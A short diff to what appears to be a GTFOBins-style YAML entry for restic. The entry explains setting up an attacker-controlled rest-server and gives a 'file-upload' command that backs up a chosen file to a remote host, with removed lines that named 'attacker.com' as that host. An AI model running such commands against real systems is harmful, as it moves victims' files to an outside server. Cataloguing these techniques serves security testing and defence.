@@ -3,7 +3,6 @@ description: |
   The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:
 
   ```console
-  RPORT=12345
   NAME=backup_name
   ./rest-server --listen ":$RPORT"
   restic init -r "rest:http://localhost:$RPORT/$NAME"
@@ -19,9 +18,6 @@ description: |
 functions:
   file-upload:
     - code: |
-        RHOST=attacker.com
-        RPORT=12345
-        LFILE=file_or_dir_to_get
         NAME=backup_name
         restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
 ---
